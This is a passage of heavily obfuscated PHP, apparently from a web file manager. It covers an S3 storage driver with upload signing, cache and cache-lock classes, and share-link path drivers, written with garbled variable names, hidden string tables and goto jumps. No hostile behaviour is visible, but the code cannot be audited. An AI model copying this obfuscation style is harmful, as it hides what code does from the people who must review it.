objectMeta($”€ïÒïµ) { return $this->cacheMethod($_SERVER[íû‘ş´][168], $”€ïÒïµ); } protected function _objectMeta($šÚ­šÑ) { $Œ°¨†öŠ =& $_SERVER[íû‘ş´]; list($—üª³öƒ, $íëò¬Íæ) = $this->bucketManager->stat($this->bucket, $šÚ­šÑ); if ($—üª³öƒ) { $—üª³öƒ[$Œ°¨†öŠ[76]] = intval($—üª³öƒ[$Œ°¨†öŠ[1470]]); } return $—üª³öƒ; } protected function _isFolder($åÈÀëÈË) { $£ï÷Òå =& $_SERVER[íû‘ş´]; if ($åÈÀëÈË == $£ï÷Òå[12] || $åÈÀëÈË == $£ï÷Òå[8]) { return !0; } list($‚Û³ú¬, $ç™í¦®Ê) = $this->bucketManager->listFiles($this->bucket, trim($åÈÀëÈË, $£ï÷Òå[8]) . $£ï÷Òå[8], $£ï÷Òå[12], 1, $£ï÷Òå[8]); return !empty($‚Û³ú¬[$£ï÷Òå[1473]]) || !empty($‚Û³ú¬[$£ï÷Òå[1474]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($„ûô¡À) { parent::__construct($„ûô¡À); } public function uploadFormData($¡ÓŠ‹‡, $…Ş›§× = 3600) { $™ŒğÚğï =& $_SERVER[íû‘ş´]; $‘ªÜĞÎˆ = $™ŒğÚğï[213]; $ºÎåúº£ = $™ŒğÚğï[253]; $¢µÂô×» = $™ŒğÚğï[62]; $¡ÖÚğÁ‹ = gmdate($™ŒğÚğï[254]); $¥ºéí = gmdate($™ŒğÚğï[255]); $«Ü–Î‰ğ = $™ŒğÚğï[256]; $Û¡Û¸Ş† = $…Ş›§× . $™ŒğÚğï[12]; $¬Ò¶‡«õ = $™ŒğÚğï[257]; $Ç–îÙƒ = array($this->accessKey, $¥ºéí, $this->region, $¢µÂô×», $«Ü–Î‰ğ); $õ÷ì±ãô = implode($™ŒğÚğï[8], $Ç–îÙƒ); $šš·ÅÊÀ = array($™ŒğÚğï[258] => gmdate($™ŒğÚğï[1382], strtotime($™ŒğÚğï[260])), $™ŒğÚğï[261] => array(array($™ŒğÚğï[262] => $this->bucket), array($™ŒğÚğï[263] => $‘ªÜĞÎˆ), array($™ŒğÚğï[264], $™ŒğÚğï[265], $™ŒğÚğï[12]), array($™ŒğÚğï[264], $™ŒğÚğï[266], $™ŒğÚğï[12]), array($™ŒğÚğï[264], $™ŒğÚğï[267], $™ŒğÚğï[12]), array($™ŒğÚğï[268] => $¬Ò¶‡«õ), array($™ŒğÚğï[269] => $õ÷ì±ãô), array($™ŒğÚğï[270] => $ºÎåúº£), array($™ŒğÚğï[271] => $¡ÖÚğÁ‹), array($™ŒğÚğï[272] => $Û¡Û¸Ş†))); $ÑïëÑ•‡ = base64_encode(json_encode($šš·ÅÊÀ)); $™ÏæÔ„ = hash_hmac($™ŒğÚğï[273], $¥ºéí, $™ŒğÚğï[274] . $this->secret, !0); $áõÏ‹€ = hash_hmac($™ŒğÚğï[273], $this->region, $™ÏæÔ„, !0); $œ×Î“¹º = hash_hmac($™ŒğÚğï[273], $¢µÂô×», $áõÏ‹€, !0); $İÅÎŸ·‰ = hash_hmac($™ŒğÚğï[273], $«Ü–Î‰ğ, $œ×Î“¹º, !0); $İÅúòóï = hash_hmac($™ŒğÚğï[273], $ÑïëÑ•‡, $İÅÎŸ·‰); $Ôıõ¹«û = array($™ŒğÚğï[230] => $™ŒğÚğï[12], $™ŒğÚğï[275] => $™ŒğÚğï[12], $™ŒğÚğï[263] => $‘ªÜĞÎˆ, $™ŒğÚğï[268] => $¬Ò¶‡«õ, $™ŒğÚğï[276] => $ÑïëÑ•‡, $™ŒğÚğï[277] => $õ÷ì±ãô, $™ŒğÚğï[278] => $ºÎåúº£, $™ŒğÚğï[279] => $¡ÖÚğÁ‹, $™ŒğÚğï[280] => $Û¡Û¸Ş†, $™ŒğÚğï[281] => $İÅúòóï, $™ŒğÚğï[196] => $this->getHost()); return $Ôıõ¹«û; } public function multiUploadFormData($×°ÂÓ, $Á¨ÊëÉ— = 3600) { $…ÍøÇÄ‚ =& $_SERVER[íû‘ş´]; $Â±êŒ®ô = gmdate($…ÍøÇÄ‚[1485]); $©Ô°†÷Œ = array(); $ÂüÎÍ³ì = $this->client->getUploadId($this->bucket, $×°ÂÓ, $©Ô°†÷Œ); if (!$ÂüÎÍ³ì) { return !1; } return array($…ÍøÇÄ‚[238] => $ÂüÎÍ³ì, $…ÍøÇÄ‚[196] => $this->getHost() . $…ÍøÇÄ‚[8] . $this->pathEncode($×°ÂÓ), $…ÍøÇÄ‚[239] => $Â±êŒ®ô, $…ÍøÇÄ‚[94] => $×°ÂÓ); } public function multiUploadAuthData($ñåÎş§â, $Ä¬åˆ¾Ç = array()) { $¥‰‚€êº =& $_SERVER[íû‘ş´]; $Ò´ãÑ¬È = isset($Ä¬åˆ¾Ç[$¥‰‚€êº[175]]) ? $Ä¬åˆ¾Ç[$¥‰‚€êº[175]] : $¥‰‚€êº[12]; $Æ»å› = $Ä¬åˆ¾Ç[$¥‰‚€êº[94]]; unset($Ä¬åˆ¾Ç[$¥‰‚€êº[94]]); if (isset($Ä¬åˆ¾Ç[$¥‰‚€êº[240]])) { return $this->listUploadParts($Æ»å›, $Ä¬åˆ¾Ç); } $œ¯ˆ¥¿¼ = array(); if (isset($Ä¬åˆ¾Ç[$¥‰‚€êº[1486]])) { $œ¯ˆ¥¿¼[$¥‰‚€êº[1487]] = $Ä¬åˆ¾Ç[$¥‰‚€êº[1486]]; } $­Îºá¾ = explode($¥‰‚€êº[198], $this->getHost()); $ÀÆÙ –Í = array($¥‰‚€êº[1488] => $­Îºá¾[1], $¥‰‚€êº[1489] => $¥‰‚€êº[12], $¥‰‚€êº[230] => $¥‰‚€êº[120], $¥‰‚€êº[275] => $Ä¬åˆ¾Ç[$¥‰‚€êº[76]]); $Š†‹åØ¼ = $¥‰‚€êº[243]; $æËËášÉ = $¥‰‚€êº[8] . $this->pathEncode($Æ»å›) . $Ò´ãÑ¬È; $ñş§Ì“ª = $this->client->__getSignatureV4($œ¯ˆ¥¿¼, $ÀÆÙ –Í, $Š†‹åØ¼, $æËËášÉ); if (strpos($Ò´ãÑ¬È, $¥‰‚€êº[242]) === 0) { if (isset($œ¯ˆ¥¿¼[$¥‰‚€êº[1487]])) { $Ê¥ÊÎÎÙ = $œ¯ˆ¥¿¼[$¥‰‚€êº[1487]]; } else { if (isset($ñş§Ì“ª[$¥‰‚€êº[1487]])) { $Ê¥ÊÎÎÙ = $ñş§Ì“ª[$¥‰‚€êº[1487]]; } else { $Ê¥ÊÎÎÙ = hash($¥‰‚€êº[273], $¥‰‚€êº[12]); } } return array($¥‰‚€êº[249] => $ñş§Ì“ª[$¥‰‚€êº[249]], $¥‰‚€êº[1487] => $Ê¥ÊÎÎÙ, $¥‰‚€êº[239] => $ñş§Ì“ª[$¥‰‚€êº[1490]]); } return $ñş§Ì“ª[$¥‰‚€êº[249]]; } public function listUploadParts($˜°ó´¯’, $íÍ†ùËÑ = array()) { $§¬õì† =& $_SERVER[íû‘ş´]; $õàÂ±è¡ = str_replace($§¬õì†[250], $§¬õì†[12], $íÍ†ùËÑ[$§¬õì†[175]]); $€‚ºû‹° = $this->client->listParts($this->bucket, $˜°ó´¯’, $õàÂ±è¡); if (!$€‚ºû‹°) { return !1; } $»¸ÑåšŒ = $§¬õì†[1491]; foreach ($€‚ºû‹° as $¤¼ıµÁ) { $»¸ÑåšŒ .= $§¬õì†[1492] . "\74\x50\x61\162\164\116\x75\155\142\145\162\x3e{$¤¼ıµÁ[$§¬õì†[1447]]}\x3c\57\x50\141\x72\164\x4e\165\x6d\x62\145\x72\76\xa" . "\x3c\x45\x54\141\147\x3e{$¤¼ıµÁ[$§¬õì†[1448]]}\74\57\105\124\141\147\x3e\12" . $§¬õì†[1493]; } $»¸ÑåšŒ .= $§¬õì†[1494]; $ÜóìùÍ¦ = array(); $Ê­ªØ¤¬ = explode($§¬õì†[198], $this->getHost()); $ ´ì—ø¬ = array($§¬õì†[1488] => $Ê­ªØ¤¬[1], $§¬õì†[230] => $§¬õì†[120], $§¬õì†[275] => strlen($»¸ÑåšŒ)); $Ş÷‹¾ = $§¬õì†[241]; $¯ûè‡ù = $§¬õì†[8] . $this->pathEncode($˜°ó´¯’) . $íÍ†ùËÑ[$§¬õì†[175]]; $†´´ı˜ = $this->client->__getSignatureV4($ÜóìùÍ¦, $ ´ì—ø¬, $Ş÷‹¾, $¯ûè‡ù, $»¸ÑåšŒ); return array($§¬õì†[249] => $†´´ı˜[$§¬õì†[249]], $§¬õì†[239] => $†´´ı˜[$§¬õì†[1490]], $§¬õì†[251] => $€‚ºû‹°, $§¬õì†[1487] => $†´´ı˜[$§¬õì†[1487]]); } public function link($£î‘•€, $ô©ª‹²Ë = array()) { return parent::link($£î‘•€, $ô©ª‹²Ë); } public function fileOut($²ØÁÜç, $Å¡˜¾ê„ = false, $¤óÃÆ§ = false, $ğªşå¢º = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[íû‘ş´][1495])) { return parent::fileOutServer($²ØÁÜç, $Å¡˜¾ê„, $¤óÃÆ§, $ğªşå¢º); } parent::fileOut($²ØÁÜç, $Å¡˜¾ê„, $¤óÃÆ§, $ğªşå¢º); } public function fileOutImage($à÷×÷»É, $ŸÀ’÷´º = 250) { if (strstr($this->endpoint, $_SERVER[íû‘ş´][1495])) { return parent::fileOutImageServer($à÷×÷»É, $ŸÀ’÷´º); } parent::fileOutImage($à÷×÷»É, $ŸÀ’÷´º); } public function fileOutLink($£Ûë¶¤ã) { $³ßŸ½Û¸ =& $_SERVER[íû‘ş´]; if (substr($£Ûë¶¤ã, 0, 7) == $³ßŸ½Û¸[1388]) { $£Ûë¶¤ã = $³ßŸ½Û¸[1389] . substr($£Ûë¶¤ã, 7); } header($³ßŸ½Û¸[162] . $£Ûë¶¤ã); die; } public function getHost() { $‹®¾„ß– =& $_SERVER[íû‘ş´]; $Âˆı£ = str_rtrim(parent::getHost(), $‹®¾„ß–[8] . $this->bucket); $Âˆı£ = explode($‹®¾„ß–[198], $Âˆı£); return $Âˆı£[0] . $‹®¾„ß–[198] . $this->bucket . $‹®¾„ß–[10] . $Âˆı£[1]; } } goto dœ³“õôò; EÍ¥¡§ŸÓ¿: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¦³‰…¼ =& $_SERVER[íû‘ş´]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $™¥ ªà = $GLOBALS[$¦³‰…¼[6]][$¦³‰…¼[393]]; $´êÔ™³ğ = $™¥ ªà[$™¥ ªà[$¦³‰…¼[886]]]; $«¥Ã’öæ = $™¥ ªà[$¦³‰…¼[887]]; switch ($™¥ ªà[$¦³‰…¼[886]]) { case $¦³‰…¼[21]: self::$handle = Model($¦³‰…¼[888]); break; case $¦³‰…¼[889]: self::$handle = new CacheRedis($´êÔ™³ğ, $«¥Ã’öæ); break; case $¦³‰…¼[890]: self::$handle = new CacheMemcached($´êÔ™³ğ, $«¥Ã’öæ); break; case $¦³‰…¼[214]: self::$handle = new CacheFile($´êÔ™³ğ, $«¥Ã’öæ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($øØÙ„Å†) { if (is_array($øØÙ„Å†) || is_object($øØÙ„Å†)) { $øØÙ„Å† = json_encode($øØÙ„Å†); } $øØÙ„Å† = rawurlencode($øØÙ„Å†); return md5(KOD_SITE_ID . $_SERVER[íû‘ş´][11] . $øØÙ„Å†); } public static function get($ÅæŸ‡“ö, $ÇùÑÄŞ = false) { $«íê¹± = self::key($ÅæŸ‡“ö); $ªãÀ¼ = self::init(); if ($ÇùÑÄŞ) { return unserialize($ªãÀ¼->get($«íê¹±)); } if (!isset(self::$memoryCache[$«íê¹±])) { $ÆÈïÆ¬ = $ªãÀ¼->get($«íê¹±); self::$memoryCache[$«íê¹±] = unserialize($ÆÈïÆ¬); } return self::$memoryCache[$«íê¹±]; } public static function set($ùº¹ºøá, $¢³©ÜÊ¤, $ËéÌÖ³ = false) { $©¯¶İ®“ =& $_SERVER[íû‘ş´]; $âòÙõ¯ = self::key($ùº¹ºøá); if (isset(self::$memoryCache[$âòÙõ¯]) && self::$memoryCache[$âòÙõ¯] === $¢³©ÜÊ¤) { return !0; } if ($ËéÌÖ³ === 0) { self::$memoryCache[$âòÙõ¯] = $¢³©ÜÊ¤; return !0; } $¾éü™¼Ñ = self::init(); $İ¥©ôî© = serialize($¢³©ÜÊ¤); CacheLock::lock($ùº¹ºøá . $©¯¶İ®“[891]); $¶”šÌ = $¾éü™¼Ñ->set($âòÙõ¯, $İ¥©ôî©, $ËéÌÖ³); self::$memoryCache[$âòÙõ¯] = $¢³©ÜÊ¤; CacheLock::unlock($ùº¹ºøá . $©¯¶İ®“[891]); return $¶”šÌ; } public static function getCall($İÎÓ‰¯×, $›Úà¬ŸÃ, $©ÇÎßƒ¿, $³öåŠª¨ = array()) { $´¸Ú”ÆÌ =& $_SERVER[íû‘ş´]; $˜Â˜Ú³ = self::get($İÎÓ‰¯×); if ($˜Â˜Ú³ || $˜Â˜Ú³ === $´¸Ú”ÆÌ[12]) { return $˜Â˜Ú³; } $˜Â˜Ú³ = call_user_func_array($©ÇÎßƒ¿, $³öåŠª¨); $˜Â˜Ú³ = $˜Â˜Ú³ ? $˜Â˜Ú³ : $´¸Ú”ÆÌ[12]; self::set($İÎÓ‰¯×, $˜Â˜Ú³, $›Úà¬ŸÃ); return $˜Â˜Ú³; } public static function remove($ŒüÔÏÏ§) { $ÉÅ«ØÌ· = self::key($ŒüÔÏÏ§); unset(self::$memoryCache[$ÉÅ«ØÌ·]); self::clearTimeout(); CacheLock::lock($ŒüÔÏÏ§); $·š·¸®ü = self::init()->remove($ÉÅ«ØÌ·); CacheLock::unlock($ŒüÔÏÏ§); return $·š·¸®ü; } public static function removeMemory($ûèÔøªú) { $Ñˆºö±“ = self::key($ûèÔøªú); unset(self::$memoryCache[$Ñˆºö±“]); } public static function clearMemory($ãñçñ¬œ = false) { if ($ãñçñ¬œ) { $ãñçñ¬œ = self::key($ãñçñ¬œ); unset(self::$memoryCache[$ãñçñ¬œ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[íû‘ş´][892])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[íû‘ş´][893])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ö®Ì§—·, $ë˜òÎæÔ) { $¬¡Õ šø =& $_SERVER[íû‘ş´]; $this->cachePath = $Ö®Ì§—·[$¬¡Õ šø[84]]; $this->prefix = $¬¡Õ šø[894]; $this->cacheTime = $ë˜òÎæÔ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($‚¹¦œ™ˆ) { $šÏ¹òŞ =& $_SERVER[íû‘ş´]; $‚¹¦œ™ˆ = str_replace(array($šÏ¹òŞ[895], $šÏ¹òŞ[97], $šÏ¹òŞ[73]), $šÏ¹òŞ[896], $‚¹¦œ™ˆ); return $this->cachePath . $šÏ¹òŞ[897] . $‚¹¦œ™ˆ . $šÏ¹òŞ[898]; } public function set($¬şæ¹ñ, $€Ú¢şÍ€, $’×è—ì† = false) { $’×è—ì† = $’×è—ì† ? $’×è—ì† : $this->cacheTime; $êÙ§¬èı = $this->getFile($¬şæ¹ñ); if (file_put_contents($êÙ§¬èı, $this->prefix . $€Ú¢şÍ€, LOCK_EX)) { @touch($êÙ§¬èı, intval(time() + $’×è—ì†)); clearstatcache(); return !0; } @unlink($êÙ§¬èı); return !1; } public function get($ƒ–‰¥•Ë) { $Àı•£€Ğ = $this->getFile($ƒ–‰¥•Ë); if (file_exists($Àı•£€Ğ) && filemtime($Àı•£€Ğ) < time()) { @unlink($Àı•£€Ğ); return !1; } $Åš¦ÍÌª = @file_get_contents($Àı•£€Ğ); return substr($Åš¦ÍÌª, strlen($this->prefix)); } public function remove($ø¤í·îğ) { $á¾¢ÉÍ– = $this->getFile($ø¤í·îğ); return @unlink($á¾¢ÉÍ–); } public function deleteAll() { $•ßÌòØİ =& $_SERVER[íû‘ş´]; $ò°‡ñ = scandir($this->cachePath); foreach ($ò°‡ñ as $’ªêè¤¬) { $Ú‰¶Œ”± = $this->cachePath . $’ªêè¤¬; if (strpos($Ú‰¶Œ”±, $•ßÌòØİ[898]) && strpos($Ú‰¶Œ”±, $•ßÌòØİ[899])) { @unlink($Ú‰¶Œ”±); } } } public function clearTimeout() { $–çÃâÖ =& $_SERVER[íû‘ş´]; $¦Ç¡½¤¼ = scandir($this->cachePath); foreach ($¦Ç¡½¤¼ as $Œ¢‚º”¨) { $¶â½ÌÛÑ = $this->cachePath . $Œ¢‚º”¨; if (strpos($¶â½ÌÛÑ, $–çÃâÖ[898]) && strpos($¶â½ÌÛÑ, $–çÃâÖ[899]) && filemtime($¶â½ÌÛÑ) < time()) { @unlink($¶â½ÌÛÑ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $—Ñ¸‚Úî =& $_SERVER[íû‘ş´]; if (self::$handle) { return self::$handle; } $õÖşæ•‘ = $GLOBALS[$—Ñ¸‚Úî[6]][$—Ñ¸‚Úî[393]]; self::$timeout = $õÖşæ•‘[$—Ñ¸‚Úî[900]] ? $õÖşæ•‘[$—Ñ¸‚Úî[900]] : 10; $ğ€³—„œ = _get($GLOBALS[$—Ñ¸‚Úî[6]], $—Ñ¸‚Úî[901]); $„—Æ™”– = $õÖşæ•‘[$—Ñ¸‚Úî[886]] ? $õÖşæ•‘[$—Ñ¸‚Úî[886]] : $—Ñ¸‚Úî[214]; if ($„—Æ™”– == $—Ñ¸‚Úî[21] && $ğ€³—„œ == $—Ñ¸‚Úî[13]) { $„—Æ™”– = $—Ñ¸‚Úî[214]; } switch ($„—Æ™”–) { case $—Ñ¸‚Úî[889]: self::$handle = new CacheLockRedis(); break; case $—Ñ¸‚Úî[890]: self::$handle = new CacheLockMemcached(); break; case $—Ñ¸‚Úî[21]: self::$handle = new CacheLockDatabase(); break; case $—Ñ¸‚Úî[214]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($—Ñ¸‚Úî[902], $—Ñ¸‚Úî[903]); } return self::$handle; } private static function key($Éöß†à’) { return $_SERVER[íû‘ş´][904] . Cache::key($Éöß†à’); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($®ä„ì¤ = '') { self::$errorMsg = $®ä„ì¤; } public static function lockGlobal($ˆå½Ìçı, $˜Î´™¸È) { return self::lock($ˆå½Ìçı, $˜Î´™¸È, !0); } public static function lock($ù³ôÇúâ, $´×…ö = false, $‡øí°°í = false) { $‘“îÜª¤ =& $_SERVER[íû‘ş´]; $»Æ¯¤Ÿñ = self::init(); $éœ—ß¨¨ = self::key($ù³ôÇúâ); $´×…ö = $´×…ö ? $´×…ö : self::$timeout; $Ü¬›†Êë = timeFloat(); $Â“›×ä = $»Æ¯¤Ÿñ->lock($éœ—ß¨¨, $´×…ö); $²ù‘šÄ = timeFloat(); if (!$Â“›×ä) { $öÕÌ€ñé = "\154\x6f\x63\153\x20\x65\162\162\x6f\x72\x3b\153\145\x79\x3d{$ù³ôÇúâ}\73\x74\x69\x6d\145\x3d{$´×…ö}\73" . self::$errorMsg . $‘“îÜª¤[71] . get_caller_msg(); $¼¸‘ùœÈ = LNG($‘“îÜª¤[905]) . "\50{$´×…ö}\163\51\x2e" . LNG($‘“îÜª¤[906]); $¼¸‘ùœÈ .= $‘“îÜª¤[907]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¼¸‘ùœÈ = $¼¸‘ùœÈ . $‘“îÜª¤[908] . self::$errorMsg; } write_log($‘“îÜª¤[909] . sprintf($‘“îÜª¤[910], timeFloat() - $Ü¬›†Êë) . $‘“îÜª¤[911] . $öÕÌ€ñé . $‘“îÜª¤[912] . error_get_last(), $‘“îÜª¤[903]); show_json($¼¸‘ùœÈ, !1); } if (!$‡øí°°í) { self::$lockItem[$éœ—ß¨¨] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $°ˆàÔ„§ = number_format(timeFloat() - $²ù‘šÄ, 3); write_log($‘“îÜª¤[913] . $ù³ôÇúâ . $‘“îÜª¤[914] . $°ˆàÔ„§, $‘“îÜª¤[903]); } return $Â“›×ä; } public static function lockGet($™à´³Ñï) { $¾óĞû»Ø = self::key($™à´³Ñï); if (self::$lockItem[$¾óĞû»Ø]) { return self::$lockItem[$¾óĞû»Ø]; } return self::init()->lockGet($¾óĞû»Ø); } public static function unlock($ù“§Ã§²) { $•åù­åÒ =& $_SERVER[íû‘ş´]; $îÓ„ÑË = self::key($ù“§Ã§²); self::$lockItem[$îÓ„ÑË] = null; self::init()->unlock($îÓ„ÑË); if (GLOBAL_DEBUG_LOG_ALL) { write_log($•åù­åÒ[915] . $ù“§Ã§², $•åù­åÒ[903]); } return; } public static function unlockRuntime() { $ôÂ½Çˆï =& $_SERVER[íû‘ş´]; $áÃ¶»ğ” = self::init(); $´ï¢ğÅ = !1; foreach (self::$lockItem as $„÷¢ˆ´ => $ˆİœ¸·„) { if (!$ˆİœ¸·„) { continue; } $áÃ¶»ğ”->unlock($„÷¢ˆ´); if (!$´ï¢ğÅ) { $´ï¢ğÅ = !0; write_log($ôÂ½Çˆï[916] . $„÷¢ˆ´ . $ôÂ½Çˆï[71] . get_caller_msg(), $ôÂ½Çˆï[903]); continue; } write_log($ôÂ½Çˆï[916] . $„÷¢ˆ´, $ôÂ½Çˆï[903]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $’¥À·÷Û = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ôÂ½Çˆï[917] . $’¥À·÷Û . $ôÂ½Çˆï[918] . ACTION, $ôÂ½Çˆï[903]); } } public static function fileLock($óœªıã) { $‘‡ç¦ÍÕ =& $_SERVER[íû‘ş´]; if (!$GLOBALS[$‘‡ç¦ÍÕ[919]]) { $GLOBALS[$‘‡ç¦ÍÕ[919]] = array(); } $GLOBALS[$‘‡ç¦ÍÕ[919]][$óœªıã] = !1; $ùñ”ıªÊ = fopen(DATA_PATH . $óœªıã . $‘‡ç¦ÍÕ[920], $‘‡ç¦ÍÕ[921]); if (!$ùñ”ıªÊ) { return !1; } $GLOBALS[$‘‡ç¦ÍÕ[919]][$óœªıã] = $ùñ”ıªÊ; if (flock($ùñ”ıªÊ, LOCK_EX)) { return !0; } self::unlock($óœªıã); show_json($‘‡ç¦ÍÕ[922], !1); return !1; } public static function fileUnlock($¡›şÎœÊ) { $Ó³ª·Î =& $_SERVER[íû‘ş´]; $€ÚĞ×€¥ = $GLOBALS[$Ó³ª·Î[919]][$¡›şÎœÊ]; if (!$€ÚĞ×€¥) { return; } $GLOBALS[$Ó³ª·Î[919]][$¡›şÎœÊ] = !1; flock($€ÚĞ×€¥, LOCK_UN); fclose($€ÚĞ×€¥); } public static function fileUnlockAll() { $ø€Î¸Ó =& $_SERVER[íû‘ş´]; if (!$GLOBALS[$ø€Î¸Ó[919]]) { return; } foreach ($GLOBALS[$ø€Î¸Ó[919]] as $Œ­’‚Ğ => $ßÌİÏ‰ ) { if (!$ßÌİÏ‰ ) { continue; } $GLOBALS[$ø€Î¸Ó[919]][$Œ­’‚Ğ] = !1; flock($ßÌİÏ‰ , LOCK_UN); fclose($ßÌİÏ‰ ); } $GLOBALS[$ø€Î¸Ó[919]] = array(); } } goto D¸Ö‘ŠÎª‹; F £¹·¤ìœ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($š™ã­ÅÑ) { $this->pathParse = $š™ã­ÅÑ; $this->model = Model($_SERVER[íû‘ş´][1390]); } public function getPathOuter($ÙåÄÛÕä) { $Ä«ËÅü =& $_SERVER[íû‘ş´]; if (!$ÙåÄÛÕä) { return $ÙåÄÛÕä; } $¶­¿Ä•» = $this->parse($ÙåÄÛÕä); return trim(KodIO::makeShare($this->pathParse[$Ä«ËÅü[443]], $¶­¿Ä•»[$Ä«ËÅü[443]]), $Ä«ËÅü[8]); } protected function infoParse($‰¿õ§«, $×½ÈŒä = false, $ª“ê§¦ù = false) { $ë’ß’ô =& $_SERVER[íû‘ş´]; $šòâö± = $this->pathParse[$ë’ß’ô[443]]; $Œîì©ŠÍ = trim($this->pathParse[$ë’ß’ô[1226]], $ë’ß’ô[8]); return Action($ë’ß’ô[1397])->sharePathInfo($šòâö±, $Œîì©ŠÍ, $×½ÈŒä); } public function infoFull($¢õ¬‘à²) { $øÎªÊ¦ =& $_SERVER[íû‘ş´]; $Æ×äğì¥ = explode($øÎªÊ¦[8], trim($¢õ¬‘à², $øÎªÊ¦[8])); if (count($Æ×äğì¥) > 1) { $‡ÃÏœóà = implode($øÎªÊ¦[8], array_splice($Æ×äğì¥, 1)); $ƒÚ—ÄÊ“ = $this->model->pathInfoByPath($Æ×äğì¥[0], $‡ÃÏœóà); if (!$ƒÚ—ÄÊ“) { return !1; } $this->pathParse[$øÎªÊ¦[1226]] = $ƒÚ—ÄÊ“[$øÎªÊ¦[181]]; } return $this->infoParse($¢õ¬‘à²); } public function listAll($á‘³„›) { $Ú÷”¤¥ª =& $_SERVER[íû‘ş´]; $Ó¨ß¡ª = IO::info($this->pathParse[$Ú÷”¤¥ª[84]]); if (!$Ó¨ß¡ª) { return array(); } $»µÉğÁ = $this->model->listAll($á‘³„›); $¶•Î¤í = Model($Ú÷”¤¥ª[642])->getInfo($Ó¨ß¡ª[$Ú÷”¤¥ª[643]]); foreach ($»µÉğÁ as &$Ê¢°ÖÂ¢) { check_abort(); $Ê¢°ÖÂ¢[$Ú÷”¤¥ª[87]] = Action($Ú÷”¤¥ª[1397])->_shareItemeParse($Ê¢°ÖÂ¢[$Ú÷”¤¥ª[87]], $¶•Î¤í); } unset($Ê¢°ÖÂ¢); return $»µÉğÁ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($¥·Ÿğ‡…) { $this->pathParse = $¥·Ÿğ‡…; $this->model = Model($_SERVER[íû‘ş´][1390]); } protected function infoParse($Í‡Æ‹·¨, $ĞàÕ½¼Ï = false, $ƒì§İ“ê = false) { $ÔşÇ´…¯ =& $_SERVER[íû‘ş´]; return Action($ÔşÇ´…¯[1232])->sharePathInfo($this->pathParse[$ÔşÇ´…¯[84]], !0, $ĞàÕ½¼Ï); } public function listPath($©†¹öÄË, $ßÏŸ¿öÓ = false) { $ã”£¹Æ× =& $_SERVER[íû‘ş´]; $…¯üÑÔƒ = parent::listPath($©†¹öÄË, $ßÏŸ¿öÓ); if (!$…¯üÑÔƒ) { return $…¯üÑÔƒ; } if (is_array($…¯üÑÔƒ[$ã”£¹Æ×[1398]])) { $…¯üÑÔƒ[$ã”£¹Æ×[1398]] = Action($ã”£¹Æ×[1232])->shareItemInfo($…¯üÑÔƒ[$ã”£¹Æ×[1398]]); } foreach ($…¯üÑÔƒ as $×‡ÙİÑé => $¸«Œîœ) { if (!in_array($×‡ÙİÑé, array($ã”£¹Æ×[83], $ã”£¹Æ×[82]))) { continue; } foreach ($¸«Œîœ as $ÅÑï«« => $ò›é¶›±) { $…¯üÑÔƒ[$×‡ÙİÑé][$ÅÑï««] = Action($ã”£¹Æ×[1232])->shareItemInfo($ò›é¶›±); } } return $…¯üÑÔƒ; } public function listAll($²ıÛäŠ) { $ö¯´úÖš =& $_SERVER[íû‘ş´]; $Ò“°Ğ = IO::info($this->pathParse[$ö¯´úÖš[84]]); if (!$Ò“°Ğ) { return array(); } $ªîÃËß = $this->model->listAll($²ıÛäŠ); foreach ($ªîÃËß as &$¿˜Çœ¯) { $¿˜Çœ¯[$ö¯´úÖš[87]] = Action($ö¯´úÖš[1232])->shareItemInfo($¿˜Çœ¯[$ö¯´úÖš[87]]); } unset($¿˜Çœ¯); return $ªîÃËß; } } class PathDriverDriverShareItem { public function __construct($‡‹İÀ²) { $this->pathParse = $‡‹İÀ²; } public function __call($ëëÑÂ’à, $óş›ô¼©) { $†ë¢ç =& $_SERVER[íû‘ş´]; if (method_exists($this, $ëëÑÂ’à)) { return; } $ÄÒ–Ï’ø = call_user_func_array(array($†ë¢ç[1399], $ëëÑÂ’à), $óş›ô¼©); $¤ë¶îÈ = array($†ë¢ç[1400], $†ë¢ç[1401], $†ë¢ç[1402], $†ë¢ç[1403], $†ë¢ç[596], $†ë¢ç[598], $†ë¢ç[1404], $†ë¢ç[107], $†ë¢ç[1405], $†ë¢ç[1406]); if (in_array($ëëÑÂ’à, $¤ë¶îÈ)) { $ÄÒ–Ï’ø = $this->getPathOuter($ÄÒ–Ï’ø); } return $ÄÒ–Ï’ø; } public function copy($Ÿ†âßöÈ, $´•×½ø, $ïÍâ÷ ü = false, $óÈÈ·ĞÓ = false) { return $this->copyMove($Ÿ†âßöÈ, $´•×½ø, $ïÍâ÷ ü, $_SERVER[íû‘ş´][596], $óÈÈ·ĞÓ); } public function move($Äğ¬¶¢, $Ø Ûèş, $ÛÙŠğú› = false, $´—ª“º‚ = false) { return $this->copyMove($Äğ¬¶¢, $Ø Ûèş, $ÛÙŠğú›, $_SERVER[íû‘ş´][598], $´—ª“º‚); } private function copyMove($´Ç‡ÔÑ, $ùøí®ıè, $—Ë¿¿¦Ò, $Ãô¦î¸í, $À¿³ØÉ— = false) { $ŞˆÛ­º =& $_SERVER[íû‘ş´]; $ù¢ˆ¸à— = $ùøí®ıè; $óäüŠ¬ = IO::driverMake($ùøí®ıè); if ($óäüŠ¬->pathParse[$ŞˆÛ­º[1209]]) { $ùøí®ıè = 